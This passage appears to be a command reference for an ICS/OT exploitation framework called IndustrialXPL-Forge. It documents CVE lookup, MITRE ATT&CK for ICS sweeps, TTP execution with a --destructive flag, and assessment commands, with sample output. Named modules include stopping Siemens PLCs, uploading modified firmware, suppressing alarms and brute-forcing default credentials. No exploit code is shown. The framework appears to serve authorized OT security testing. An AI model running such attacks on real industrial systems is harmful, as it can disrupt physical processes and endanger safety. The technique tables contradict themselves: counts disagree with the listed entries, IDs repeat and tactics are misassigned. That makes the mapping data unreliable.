[*] Vendor: Siemens | Product: S7-1200/1500 PLC

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) >
```

**Example 2 — Another unique match:**

```
ixf > cve CVE-2023-6448
[*] Module loaded: CVE-2023-6448 Unitronics UniStream PLC
[*] CVE: CVE-2023-6448 | CVSS: 9.8 | Impact: CRITICAL
[*] Vendor: Unitronics | Product: Vision/UniStream PLC
```

**Example 3 — Multiple matches (disambiguation menu):**

```
ixf > cve CVE-2022-3232
[*] Multiple modules found for CVE-2022-3232:
    ┌───┬──────────────────────────────────────────────────────────────────┐
    │ # │ Module                                                           │
    ├───┼──────────────────────────────────────────────────────────────────┤
    │ 1 │ cve/ls_electric/cve_2022_3232_xgk_modbus_dos                    │
    │ 2 │ cve/scanners/ls_electric/ls_electric_xgk_scanner                │
    └───┴──────────────────────────────────────────────────────────────────┘
    Select module (number or path): 1
[*] Module loaded: CVE-2022-3232 LS Electric XGK Modbus DoS
```

**Error scenario — CVE not found:**

```
ixf > cve CVE-2099-99999
[-] No module found for: CVE-2099-99999
[i] Check: https://nvd.nist.gov/vuln/detail/CVE-2099-99999
[i] IXF may not yet cover this CVE. Contribute: CONTRIBUTING.md
```

**Error scenario — No argument:**

```
ixf > cve
[-] Usage: cve <CVE-ID>
    Example: cve CVE-2021-22681
```

**Related commands:** `use`, `search`, `cve-scan`

---

### `cve-scan <CIDR>`

Discover OT assets on a subnet and suggest a CVE testing workflow. This command is a guided placeholder — it loads the discovery module and prints recommendations for targeted CVE testing.

**Syntax:** `cve-scan <CIDR>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| CIDR | string | yes | — | IPv4 CIDR or single IP | Basic CIDR validation |

**Example 1 — CVE scan workflow:**

```
ixf > cve-scan 192.168.1.0/24
[i] CVE scan workflow for 192.168.1.0/24:
    Step 1 — Discover assets:
      ixf > mitre-scan discovery 192.168.1.0/24
    Step 2 — Identify vendors from scan results
    Step 3 — Load targeted CVE modules:
      ixf > cve CVE-2021-22681     (if Siemens PLCs found)
      ixf > cve CVE-2023-6448     (if Unitronics PLCs found)
      ixf > cve CVE-2022-29965    (if Emerson ROC800 found)
    Step 4 — Run check() to confirm:
      ixf > check
[i] For automated TTP sweep: ttp T0819 192.168.1.0/24
```

**Example 2 — With known vendor:**

```
ixf > cve-scan 10.0.0.0/24
[i] CVE scan: discover assets first with:
    mitre-scan discovery 10.0.0.0/24
[i] Then load specific CVE modules: cve <CVE-ID>
```

**Related commands:** `discover`, `cve`, `mitre-scan`, `ttp`

---

## Reports

### `report [format]`

Generate an assessment report from the current session. Captures all modules run, findings, MITRE techniques triggered, and timestamps.

**Syntax:** `report [json|html|markdown]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| format | string | no | `json` | `json`, `html`, `markdown` | Case-insensitive |

**Example 1 — JSON report:**

```
ixf > report json
[*] Generating JSON report...
[*] Session events captured: 14
[+] Report saved: ixf_report_20260601_153045.json
[i] Path: ./ixf_report_20260601_153045.json
```

**Example 2 — HTML report:**

```
ixf > report html
[*] Generating HTML report...
[+] Report saved: ixf_report_20260601_153112.html
[i] Open in browser: file:///opt/ixf/ixf_report_20260601_153112.html
```

**Example 3 — Markdown report:**

```
ixf > report markdown
[*] Generating Markdown report...
[+] Report saved: ixf_report_20260601_153201.md
[i] Compatible with GitHub, Confluence, Notion, and most wikis
```

**Error scenario — No session data:**

```
ixf > report json
[*] Generating JSON report...
[!] No session events recorded. Run some modules before generating a report.
[+] Report saved: ixf_report_20260601_153300.json (empty session)
```

**Error scenario — Invalid format:**

```
ixf > report xml
[-] Invalid report format: 'xml'. Valid: json, html, markdown
```

**Related commands:** `mitre-report`, `sast`, `assess`

---

## MITRE ATT&CK for ICS

### `mitre <TID>`

List all modules that implement a specific MITRE ATT&CK for ICS technique.

**Syntax:** `mitre <TID>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| TID | string | yes | — | MITRE technique ID (e.g. `T0843`, `T0843.001`) | Must start with T0 |

**Example 1 — Technique with multiple modules:**

```
ixf > mitre T0843
[*] Modules for T0843 (Program Download):
    ─────────────────────────────────────────────────────────────
    cve/siemens/cve_2021_22681_s7_1200_hardcoded_key         CRITICAL
    cve/siemens/cve_2022_38465_s7_global_key                 CRITICAL
    cve/rockwell/cve_2022_1161_controllogix_modified_fw      CRITICAL
    exploits/protocols/s7comm/s7_unauthorized_cpu_control    HIGH
    assessment/mitre_ics/t0843_program_upload                INFO
[*] 5 module(s) cover T0843.
```

**Example 2 — Technique with one module:**

```
ixf > mitre T0806
[*] Modules for T0806 (Brute Force I/O):
    ─────────────────────────────────────────────────────────────
    assessment/mitre_ics/t0806_brute_force_io                INFO
[*] 1 module(s) cover T0806.
```

**Example 3 — Subtechnique:**

```
ixf > mitre T0846.001
[*] Modules for T0846.001 (Remote System Discovery: Network Device Discovery):
    ─────────────────────────────────────────────────────────────
    scanners/ics/modbus_detect                               READ
    scanners/ics/s7_comm_scanner                             READ
    scanners/ics/dnp3_scanner                                READ
[*] 3 module(s) cover T0846.001.
```

**Error scenario — Unknown technique:**

```
ixf > mitre T9999
[-] No modules found for T9999.
[i] Check https://attack.mitre.org/matrices/ics/
[i] Use 'mitre-list' to see all covered techniques.
```

**Related commands:** `mitre-list`, `mitre-scan`, `ttp`

---

### `mitre-list [tactic]`

List all mapped MITRE ATT&CK for ICS techniques with module counts. Optionally filter by tactic name, alias, or TA-ID.

**Syntax:** `mitre-list [tactic_name_or_alias]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| tactic | string | no | — (all) | Tactic name: `discovery`, `execution`, `persistence`, `lateral-movement`, `collection`, `command-and-control`, `evasion`, `privilege-escalation`, `initial-access`, `inhibit-response-function`, `impair-process-control`, `impact`; or TA-ID | Case-insensitive |

**Example 1 — List all techniques:**

```
ixf > mitre-list
  MITRE ATT&CK for ICS — Technique Index (74 techniques)
  ─────────────────────────────────────────────────────────────────
  TID     Name                                   Modules  Tactic
  T0800   Activate Firmware Update Mode           1       Inhibit Response Function
  T0801   Monitor Process State                   2       Collection
  T0802   Automated Collection                    5       Collection
  T0803   Block Command Message                   2       Inhibit Response Function
  T0804   Block Reporting Message                 2       Inhibit Response Function
  T0805   Block Serial COM                        1       Inhibit Response Function
  T0806   Brute Force I/O                         1       Impair Process Control
  T0807   Command-Line Interface                  3       Execution
  T0808   Control Device Identification           1       Discovery
  T0810   Data Destruction                        3       Impact
  T0811   Data from Local System                  2       Collection
  T0812   Default Credentials                     34      Initial Access
  T0813   Denial of Control                       8       Inhibit Response Function
  T0814   Denial of View                          4       Inhibit Response Function
  T0815   Denial of Service                       12      Inhibit Response Function
  T0816   Device Restart/Shutdown                 6       Inhibit Response Function
  T0817   Drive-by Compromise                     3       Initial Access
  T0819   Exploit Public-Facing Application       47      Initial Access
  T0820   Exploitation of Remote Services         3       Lateral Movement
  T0821   Modify Controller Tasking               5       Impair Process Control
  T0822   External Remote Services                12      Initial Access
  T0823   Graphical User Interface                2       Execution
  T0824   I/O Image                               1       Collection
  T0825   Location Identification                 1       Discovery
  T0826   Loss of Availability                    3       Impact
  T0827   Loss of Control                         4       Impact
  T0828   Loss of Productivity and Revenue        2       Impact
  T0829   Loss of Protection                      2       Impact
  T0830   Adversary-in-the-Middle                 5       Collection
  T0831   Manipulation of Control                 4       Impair Process Control
  T0832   Manipulation of View                    3       Impair Process Control
  T0833   Modify Alarm Settings                   2       Inhibit Response Function
  T0834   Native API                              2       Execution
  T0835   Manipulate I/O Image                    3       Impair Process Control
  T0836   Modify Parameter                        8       Impair Process Control
  T0837   Loss of Safety                          2       Impact
  T0838   Modify Alarm Settings                   2       Evasion
  T0839   Module Firmware                         4       Persistence
  T0840   Network Connection Enumeration          2       Discovery
  T0841   Network Identification                  3       Discovery
  T0842   Network Sniffing                        3       Discovery
  T0843   Program Download                        5       Lateral Movement
  T0844   Program Organization Units              1       Evasion
  T0845   Program Upload                          3       Collection
  T0846   Remote System Discovery                 8       Discovery
  T0847   Replication Through Removable Media     2       Persistence
  T0848   Rogue Master                            3       Impair Process Control
  T0849   Masquerading                            1       Evasion
  T0850   Role Identification                     2       Discovery
  T0851   Rootkit                                 2       Evasion
  T0852   Screen Capture                          2       Collection
  T0853   Scripting                               3       Execution
  T0854   Spearphishing Attachment                2       Initial Access
  T0855   Unauthorized Command Message            6       Impair Process Control
  T0856   Spoof Reporting Message                 2       Evasion
  T0857   System Firmware                         3       Persistence
  T0858   Change Credential                       4       Evasion
  T0859   Valid Accounts                          6       Initial Access
  T0860   Wireless Compromise                     2       Initial Access
  T0861   Point and Tag Identification            2       Discovery
  T0862   Supply Chain Compromise                 2       Initial Access
  T0863   User Execution Malicious Content        3       Execution
  T0864   Transient Cyber Asset                   2       Initial Access
  T0865   Spearphishing Link                      1       Initial Access
  T0866   Exploitation of Remote Services         3       Execution
  T0867   Lateral Tool Transfer                   2       Lateral Movement
  T0868   Detect Operating Mode                   1       Discovery
  T0869   Standard Application Layer Protocol     2       Command and Control
  T0870   Network Sniffing                        3       Discovery
  T0871   Execution via Interpreter               2       Execution
  T0872   Indicator Removal on Host               1       Evasion
  T0874   Hooking                                 1       Evasion
  T0877   I/O Module Discovery                    2       Discovery
  T0878   Alarm Suppression                       3       Inhibit Response Function
  T0879   Damage to Property                      2       Impact
  T0880   Loss of Safety                          2       Impact
  T0881   Service Stop                            3       Impact
  T0883   Internet Accessible Device              4       Initial Access
  T0884   Connection Proxy                        1       Command and Control
  T0885   Commonly Used Port                      2       Command and Control
  T0886   Remote Service Session Hijacking        1       Lateral Movement
  T0887   Wireless Compromise                     2       Initial Access
  T0890   Exploitation for Privilege Escalation   2       Privilege Escalation
  ─────────────────────────────────────────────────────────────────
  TOTAL: 74 techniques | 12 tactics
```

**Example 2 — Filter by tactic:**

```
ixf > mitre-list discovery
  MITRE ATT&CK for ICS — Discovery Techniques (TA0102)
  ─────────────────────────────────────────────────────────────────
  TID     Name                                   Modules
  T0808   Control Device Identification           1
  T0825   Location Identification                 1
  T0840   Network Connection Enumeration          2
  T0841   Network Identification                  3
  T0842   Network Sniffing                        3
  T0846   Remote System Discovery                 8
  T0850   Role Identification                     2
  T0861   Point and Tag Identification            2
  T0868   Detect Operating Mode                   1
  T0870   Network Sniffing                        3
  T0877   I/O Module Discovery                    2
  ─────────────────────────────────────────────────────────────────
  11 techniques in Discovery (TA0102)
```

**Error scenario — Unknown tactic:**

```
ixf > mitre-list unknowntactic
[-] Unknown tactic: 'unknowntactic'
[i] Valid tactics: initial-access, execution, persistence, privilege-escalation,
    evasion, discovery, lateral-movement, collection, command-and-control,
    inhibit-response-function, impair-process-control, impact
```

**Related commands:** `mitre`, `mitre-scan`, `mitre-coverage`, `ttp-list`

---

### `mitre-scan <tactic_or_TID> <target> [--destructive]`

Run all modules mapped to a MITRE tactic or single technique against a target. Always uses simulate mode unless `--destructive` is passed.

**Syntax:** `mitre-scan <tactic|TID> <target> [--destructive]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| tactic or TID | string | yes | — | Tactic name/alias, TA-ID (e.g. `TA0102`), or technique ID (e.g. `T0843`) | Case-insensitive |
| target | string | yes | — | Target IP, hostname, or CIDR range | Basic IP/CIDR validation |
| `--destructive` | flag | no | — | Disable simulate mode (authorized labs only) | Triggers DestructiveGate for each module |

**Example 1 — Tactic sweep on subnet:**

```
ixf > mitre-scan discovery 192.168.1.0/24
[*] Sweeping tactic: Discovery (TA0102) on 192.168.1.0/24
[*] simulate=True (safe mode)
[*] 11 techniques | approx. 28 modules
  ─────────────────────────────────────────────────────────────────
  [*] T0808 — Control Device Identification (1 module)...
    [SIMULATE] Would probe OT devices for asset identification data
  [*] T0840 — Network Connection Enumeration (2 modules)...
    [SIMULATE] Would enumerate Modbus TCP connections on 192.168.1.0/24
    [SIMULATE] Would enumerate EtherNet/IP connections on 192.168.1.0/24
  [*] T0842 — Network Sniffing (3 modules)...
    [SIMULATE] Would capture OT protocol traffic (passive analysis)
  [*] T0846 — Remote System Discovery (8 modules)...
    [SIMULATE] Modbus TCP scan: 192.168.1.0/24:502
    [SIMULATE] S7comm scan: 192.168.1.0/24:102
    [SIMULATE] DNP3 scan: 192.168.1.0/24:20000
    [SIMULATE] BACnet scan: 192.168.1.0/24:47808
    [SIMULATE] OPC UA scan: 192.168.1.0/24:4840
    [SIMULATE] EtherNet/IP scan: 192.168.1.0/24:44818
    [SIMULATE] Omron FINS scan: 192.168.1.0/24:9600
    [SIMULATE] IEC 104 scan: 192.168.1.0/24:2404
  [*] T0861 — Point and Tag Identification (2 modules)...
    ...
  ─────────────────────────────────────────────────────────────────
[+] Tactic sweep complete: 11 techniques, 28 modules executed (simulate)
[i] To generate report: report json
```

**Example 2 — Single technique sweep:**

```
ixf > mitre-scan T0843 192.168.1.100
[*] Sweeping T0843 (Program Download) on 192.168.1.100...
[*] simulate=True
[*] 5 modules:
  [SIMULATE] cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  [SIMULATE] cve/siemens/cve_2022_38465_s7_global_key
  [SIMULATE] cve/rockwell/cve_2022_1161_controllogix_modified_fw
  [SIMULATE] exploits/protocols/s7comm/s7_unauthorized_cpu_control
  [SIMULATE] assessment/mitre_ics/t0843_program_upload
[+] T0843 sweep complete: 5 modules (simulate)
```

**Error scenario — Target required:**

```
ixf > mitre-scan discovery
[-] Usage: mitre-scan <tactic|TID> <target> [--destructive]
    Example: mitre-scan discovery 192.168.1.0/24
    Example: mitre-scan T0843 192.168.1.100
```

**Related commands:** `mitre`, `mitre-list`, `ttp`, `mitre-all`

---

### `mitre-all <target>`

Sweep all 74+ mapped MITRE ATT&CK for ICS techniques against a target. Always runs in simulate mode — cannot be overridden to destructive.

**Syntax:** `mitre-all <target>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| target | string | yes | — | Target IP, hostname, or CIDR range | Basic IP/CIDR validation |

**Example 1 — Full sweep:**

```
ixf > mitre-all 192.168.1.100
[*] Full MITRE ATT&CK for ICS sweep on 192.168.1.100 (simulate=True forced)
[*] Running 74 techniques across 12 tactics...
[*] Estimated time: ~5-10 minutes depending on timeout settings
  ─────────────────────────────────────────────────────────────────
  Tactic: Initial Access (TA0108) — 9 techniques
  [SIMULATE] T0812 — Default Credentials...
  [SIMULATE] T0817 — Drive-by Compromise...
  ...
  Tactic: Discovery (TA0102) — 11 techniques
  [SIMULATE] T0840 — Network Connection Enumeration...
  ...
  [all 74 techniques run]
  ─────────────────────────────────────────────────────────────────
[+] Full MITRE sweep complete: 74 techniques, 12 tactics
[i] Generate report: report json
[i] Generate Navigator layer: mitre-report layer
```

**Error scenario — No target:**

```
ixf > mitre-all
[-] Usage: mitre-all <target>
    Example: mitre-all 192.168.1.100
```

**Related commands:** `mitre-scan`, `mitre-coverage`, `mitre-report`

---

### `mitre-coverage`

Display coverage percentage per MITRE ATT&CK for ICS tactic and overall.

**Syntax:** `mitre-coverage`

**Context:** global

**Parameters:** none

**Example 1 — Coverage report:**

```
ixf > mitre-coverage

  MITRE ATT&CK for ICS Coverage
  ──────────────────────────────────────────────────────────────────
  Tactic                              Covered  Total   Coverage
  Initial Access (TA0108)               9        9     100% ██████████
  Execution (TA0104)                    8        9      88% █████████░
  Persistence (TA0110)                  6        8      75% ███████░░░
  Privilege Escalation (TA0111)         2        2     100% ██████████
  Evasion (TA0103)                      4        5      80% ████████░░
  Discovery (TA0102)                   11       13      84% ████████░░
  Lateral Movement (TA0109)             3        3     100% ██████████
  Collection (TA0100)                   8        9      88% █████████░
  Command and Control (TA0101)          3        3     100% ██████████
  Inhibit Response Function (TA0107)   14       18      77% ████████░░
  Impair Process Control (TA0106)       9       11      81% ████████░░
  Impact (TA0105)                       8       11      72% ███████░░░
  ──────────────────────────────────────────────────────────────────
  TOTAL                                74       90      82%
  ──────────────────────────────────────────────────────────────────
[i] Export as ATT&CK Navigator JSON: mitre-report layer
[i] ICS MITRE matrix: https://attack.mitre.org/matrices/ics/
```

**Related commands:** `mitre-list`, `mitre-report`, `coverage`

---

### `mitre-report [format]`

Generate a MITRE ATT&CK for ICS coverage report or ATT&CK Navigator-compatible layer.

**Syntax:** `mitre-report [json|html|layer]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| format | string | no | `layer` | `layer` (Navigator JSON), `json` (raw data), `html` (HTML report) | Case-insensitive |

**Example 1 — ATT&CK Navigator layer:**

```
ixf > mitre-report layer
[*] Generating ATT&CK Navigator layer...
[+] Navigator layer saved: ixf_mitre_layer_20260601_154200.json
[i] Open at: https://mitre-attack.github.io/attack-navigator/
[i] Import: File → Open Existing Layer → Upload file
[i] Color coding: red=CATASTROPHIC, orange=CRITICAL, yellow=HIGH, blue=covered
```

**Example 2 — HTML report:**

```
ixf > mitre-report html
[*] Generating HTML coverage report...
[+] Report saved: ixf_mitre_report_20260601_154315.html
[i] Coverage: 82% (74/90 techniques)
```

**Example 3 — JSON raw data:**

```
ixf > mitre-report json
[*] Generating JSON coverage data...
[+] Data saved: ixf_mitre_data_20260601_154400.json
```

**Related commands:** `mitre-coverage`, `report`

---

### `mitre-tactic <tactic> <target>`

Alias for `mitre-scan <tactic> <target>`. See [`mitre-scan`](#mitre-scan-tactic_or_tid-target---destructive) for full documentation.

**Syntax:** `mitre-tactic <tactic> <target>`

**Example:**

```
ixf > mitre-tactic initial-access 192.168.1.100
[*] Alias for: mitre-scan initial-access 192.168.1.100
[*] Sweeping tactic: Initial Access (TA0108) on 192.168.1.100...
[*] simulate=True
...
```

---

## TTP Execution

### `ttp <TID> <target> [flags]`

Execute all modules mapped to a specific MITRE technique ID against a target. By default runs in simulate mode. Supports subnet sweeps, rate limiting, stop-on-first, and output file.

**Syntax:** `ttp <TID> <target> [--destructive] [--stop-on-first] [--output <file>] [--rate-limit <ms>]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| TID | string | yes | — | MITRE technique ID (e.g. `T0843`, `T0843.001`) | Must start with T0 |
| target | string | yes | — | Target IP, hostname, or CIDR range | IP/CIDR validation |
| `--destructive` | flag | no | — | Disable simulate mode; requires DestructiveGate confirmation per module | Only for authorized labs |
| `--stop-on-first` | flag | no | — | Stop after first confirmed hit | N/A |
| `--output <file>` | string | no | — | Save results to specified file (JSON) | Valid path |
| `--rate-limit <ms>` | int | no | 0 | Milliseconds between module executions | 0-60000 |

**Example 1 — Basic TTP sweep:**

```
ixf > ttp T0843 192.168.1.100
[*] TTP T0843 (Program Download) — 5 modules — simulate=True
[*] Running module 1/5: cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  [SIMULATE] CVE-2021-22681 would attempt S7comm+ TLS MitM on 192.168.1.100:102
[*] Running module 2/5: cve/siemens/cve_2022_38465_s7_global_key
  [SIMULATE] CVE-2022-38465 would exploit S7comm global private key on 192.168.1.100:102
[*] Running module 3/5: cve/rockwell/cve_2022_1161_controllogix_modified_fw
  [SIMULATE] CVE-2022-1161 would upload modified firmware to ControlLogix on 192.168.1.100:44818
[*] Running module 4/5: exploits/protocols/s7comm/s7_unauthorized_cpu_control
  [SIMULATE] Would send S7 unauthorized STOP command to 192.168.1.100:102
[*] Running module 5/5: assessment/mitre_ics/t0843_program_upload
  [SIMULATE] T0843 assessment module — assessing program upload protections
[+] T0843 sweep complete: 5 modules, 5 simulate runs
[i] To run live: ttp T0843 192.168.1.100 --destructive (authorized lab only)
```

**Example 2 — Subnet TTP with rate limit:**

```
ixf > ttp T0878 10.0.0.0/24 --rate-limit 500
[*] TTP T0878 (Alarm Suppression) — subnet 10.0.0.0/24 — 500ms between modules
[*] simulate=True | 3 modules
  [SIMULATE] Module 1: exploits/protocols/modbus/modbus_alarm_suppression
  [500ms wait]
  [SIMULATE] Module 2: exploits/protocols/dnp3/dnp3_alarm_suppression
  [500ms wait]
  [SIMULATE] Module 3: assessment/mitre_ics/t0878_alarm_suppression
[+] T0878 sweep complete: 3 modules on /24
```

**Example 3 — Stop-on-first with output file:**

```
ixf > ttp T0859 192.168.1.1 --stop-on-first --output results.json
[*] TTP T0859 (Valid Accounts) — stop-on-first — output: results.json
[*] simulate=True | 6 modules
[*] Module 1/6: creds/siemens/ssh_default_creds
  [SIMULATE] Would test 47 default SSH credentials against 192.168.1.1:22
[+] First simulate match found. Stopping (--stop-on-first).
[+] Results saved: results.json
```

**Error scenario — Unknown TID:**

```
ixf > ttp T9999 192.168.1.1
[-] No modules found for TID: T9999
[i] Use 'mitre-list' to see all covered techniques.
```

**Related commands:** `ttp-check`, `ttp-simulate`, `ttp-list`, `mitre-scan`

---

### `ttp-check <TID> <target>`

Run only the `check()` probe for all modules mapped to a technique — read-only, no exploit payloads. Always safe.

**Syntax:** `ttp-check <TID> <target>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| TID | string | yes | — | MITRE technique ID | Must start with T0 |
| target | string | yes | — | Target IP or CIDR | IP/CIDR validation |

**Example 1 — Check T0843 modules:**

```
ixf > ttp-check T0843 192.168.1.100
[*] T0843 check-only sweep on 192.168.1.100...
[*] 5 modules (read-only probes only)
  [*] cve/siemens/cve_2021_22681_s7_1200_hardcoded_key — checking 192.168.1.100:102...
    [+] POTENTIAL — Port 102 open, S7comm+ banner detected
  [*] cve/siemens/cve_2022_38465_s7_global_key — checking 192.168.1.100:102...
    [+] POTENTIAL — Same device as above
  [*] cve/rockwell/cve_2022_1161_controllogix_modified_fw — checking 192.168.1.100:44818...
    [-] NOT VULNERABLE — Port 44818 closed
  [*] exploits/protocols/s7comm/s7_unauthorized_cpu_control — checking 192.168.1.100:102...
    [+] POTENTIAL — S7comm accessible without authentication
  [*] assessment/mitre_ics/t0843_program_upload — assessment (no check method)
    [i] Skipped — assessment module, no check() method
[+] T0843 check complete: 3 potential, 1 not vulnerable, 1 skipped
[i] Run 'ttp T0843 192.168.1.100' to see simulation details
```

**Related commands:** `ttp`, `ttp-simulate`, `check`

---

### `ttp-simulate <TID> <target>`

Force simulate mode for all modules mapped to a technique. Prints what each module would do without sending any packets.

**Syntax:** `ttp-simulate <TID> <target>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| TID | string | yes | — | MITRE technique ID | Must start with T0 |
| target | string | yes | — | Target IP or CIDR | IP/CIDR validation |

**Example 1 — Simulate T0866:**

```
ixf > ttp-simulate T0866 192.168.1.100
[*] T0866 (Exploitation of Remote Services) simulation on 192.168.1.100 (simulate forced)
[*] simulate=True (forced — cannot be overridden)
[*] 3 modules:
  [SIMULATE] Module 1: cve/emerson/cve_2022_29965_roc800_hardcoded_creds
    Would send hardcoded credentials to ROC800 REST API on 192.168.1.100:443
  [SIMULATE] Module 2: cve/moxa/cve_2019_9084_nport_telnet_rce
    Would exploit Moxa NPort telnet buffer overflow on 192.168.1.100:23
  [SIMULATE] Module 3: assessment/mitre_ics/t0866_exploitation_remote_services
    T0866 checklist assessment
[+] T0866 simulation complete.
```

**Related commands:** `ttp`, `ttp-check`

---

### `ttp-list [--tactic <name>]`

List all MITRE ATT&CK for ICS technique IDs (TTPs) with module counts. Optionally filter by tactic.

**Syntax:** `ttp-list [--tactic <tactic_name>]`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| `--tactic` | string | no | — (all) | Tactic name or alias | Case-insensitive |

**Example 1 — List all TTPs:**

```
ixf > ttp-list
  TTP Index — All Techniques (74 total)
  ─────────────────────────────────────────────────────────────────
  TID     Name                                    Modules   Tactic
  T0800   Activate Firmware Update Mode           1         Inhibit Response Function
  T0801   Monitor Process State                   2         Collection
  T0802   Automated Collection                    5         Collection
  T0803   Block Command Message                   2         Inhibit Response Function
  T0804   Block Reporting Message                 2         Inhibit Response Function
  T0805   Block Serial COM                        1         Inhibit Response Function
  T0806   Brute Force I/O                         1         Impair Process Control
  T0807   Command-Line Interface                  3         Execution
  T0808   Control Device Identification           1         Discovery
  T0810   Data Destruction                        3         Impact
  T0811   Data from Local System                  2         Collection
  T0812   Default Credentials                     34        Initial Access
  T0813   Denial of Control                       8         Inhibit Response Function
  ...
  [74 entries total]
```

**Example 2 — Filter by tactic:**

```
ixf > ttp-list --tactic evasion
  TTP Index — Evasion (TA0103) — 5 techniques
  ─────────────────────────────────────────────────────────────────
  TID     Name                                    Modules
  T0820   Exploitation of Remote Services          3
  T0838   Modify Alarm Settings                    2
  T0844   Program Organization Units               1
  T0849   Masquerading                             1
  T0851   Rootkit                                  2
  T0856   Spoof Reporting Message                  2
  T0858   Change Credential                        4
  T0872   Indicator Removal on Host                1
  T0874   Hooking                                  1
```

**Related commands:** `mitre-list`, `ttp`

---

## Assessment

### `assess <module_path>`

Load and immediately execute an assessment module. Equivalent to `use assessment/<path>` followed by `run`.

**Syntax:** `assess <module_path>`

**Context:** global

**Parameters:**

| Argument | Type | Required | Default | Valid Values | Validation |
|----------|------|----------|---------|--------------|------------|
| module_path | string | yes | — | Path relative to `assessment/` (with or without `assessment/` prefix) | Must resolve to an assessment module |

**Example 1 — IEC 62443 audit:**

```
ixf > assess iec62443/zone_conduit_audit
[*] Loading assessment/iec62443/zone_conduit_audit...
[*] Running IEC 62443 Zone and Conduit Audit...

  IEC 62443 Zone and Conduit Audit
  ──────────────────────────────────────────────────────────────────
  Check                               Result    Notes
  IT/OT zone separation               MANUAL    Verify Level 3→2 firewall rules
  Protocol whitelisting (Purdue)      MANUAL    Check only OT protocols in ICS zone
  Remote access authentication        MANUAL    VPN + MFA required for OT zones
  Jump server / DMZ presence          MANUAL    Historian in DMZ, not directly in OT
  Zone/conduit documentation          MANUAL    Zones defined in security plan
  Redundant control path              MANUAL    Primary/secondary network separation
  ──────────────────────────────────────────────────────────────────
  [i] IEC 62443-3-3: Security Level target SL2 baseline requirements
```

**Example 2 — NIST SP 800-82r3 checklist:**

```
ixf > assess nist_sp800_82/control_checklist
[*] Running NIST SP 800-82r3 Industrial Control System Security Checklist...

  NIST SP 800-82r3 Control Checklist
  ──────────────────────────────────────────────────────────────────
  Control Domain           Check                              Status
  Access Control           AC-2: Account management           REVIEW
  Access Control           AC-17: Remote access               REVIEW
  Audit and Accountability AU-6: Audit review                 REVIEW
  Configuration Mgmt       CM-7: Least functionality          REVIEW
  Incident Response        IR-4: Incident handling            REVIEW
  Risk Assessment          RA-3: Risk assessment              REVIEW
  System Protection        SC-7: Boundary protection          REVIEW
  System Integrity         SI-2: Flaw remediation             REVIEW
  ──────────────────────────────────────────────────────────────────
```

**Example 3 — Risk scorer:**

```
ixf > assess risk/ics_risk_scorer
[*] ICS Risk Scoring...

  ICS Risk Score Methodology
  ──────────────────────────────────────────────────────────────────
  Factor                   Weight   Assessment
  Network exposure          30%     Internet-facing ICS: CRITICAL
  Authentication strength   25%     No auth on Modbus: HIGH
  Safety system separation  25%     SIS on same network: HIGH
  Patch level               15%     Firmware > 3 years: HIGH
  Logging/monitoring         5%     No OT-specific SOC: MEDIUM
  ──────────────────────────────────────────────────────────────────
  Composite Score: 8.7 / 10 (CRITICAL)
```

**Example 4 — ICS Kill Chain:**

```
ixf > assess threat_intel/ics_kill_chain
[*] Running ICS Kill Chain Assessment...

  ICS Kill Chain — Phases
  ──────────────────────────────────────────────────────────────────
  Phase 1  [Recon]            External reconnaissance of exposed OT assets
  Phase 2  [Weaponization]    ICS malware / custom payload development
  Phase 3  [Delivery]         Spearphishing / supply chain / USB
  Phase 4  [Exploitation]     CVE exploitation (initial IT foothold)
  Phase 5  [Installation]     Lateral movement to OT DMZ
  Phase 6  [C2 Installation]  Establish OT-specific C2 (Industroyer-style)
  Phase 7  [Execution ICS]    ICS payload delivery to field devices
  Phase 8  [Impact]           Physical disruption / equipment damage
  ──────────────────────────────────────────────────────────────────
  [i] MITRE ATT&CK for ICS maps to phases 4-8
```

**Error scenario — Module not found:**

```
ixf > assess badpath/bad_module
[-] Assessment module not found: badpath/bad_module
[i] Available: iec62443/, nist_sp800_82/, risk/, protocols/, network/, threat_intel/, ir/, mitre_ics/
```

**Related commands:** `use`, `run`, `report`

---

## Statistics & Coverage

### `stats`

Display module statistics, vendor coverage, and MITRE ATT&CK coverage summary.

**Syntax:** `stats`

**Context:** global

**Parameters:** none

**Example 1 — Statistics output:**

```
ixf > stats
[i] IXF Module Statistics — IndustrialXPL-Forge v1.0.13

  Total Modules: 976
  ──────────────────────────────────────────────────────────────────
  Category          Count     Percentage
  cve                 486         49.8%
  exploits            159         16.3%
  creds                34          3.5%
  scanners             31          3.2%
  assessment           18          1.8%
  generic              12          1.2%
  malware_ttps         26          2.7%
  other               210         21.5%
  ──────────────────────────────────────────────────────────────────

  Coverage Summary
  ──────────────────────────────────────────────────────────────────
  Vendors covered        : 150
  Protocols covered      : 50
  MITRE techniques mapped: 74 / 90 (82%)
  MITRE tactics covered  : 12 / 12 (100%)
  Malware TTPs           : 26 (KillDisk, NotPetya, FrostyGoop, EKANS, CosmicEnergy...)
  NSE scripts            : 8

  Top Vendors by Module Count
  ──────────────────────────────────────────────────────────────────
  Schneider Electric      39 modules
  Rockwell Automation     38 modules
  Siemens                 27 modules
  ABB                     22 modules
  Honeywell               20 modules
  GE / GE Vernova         18 modules
  Emerson                 16 modules

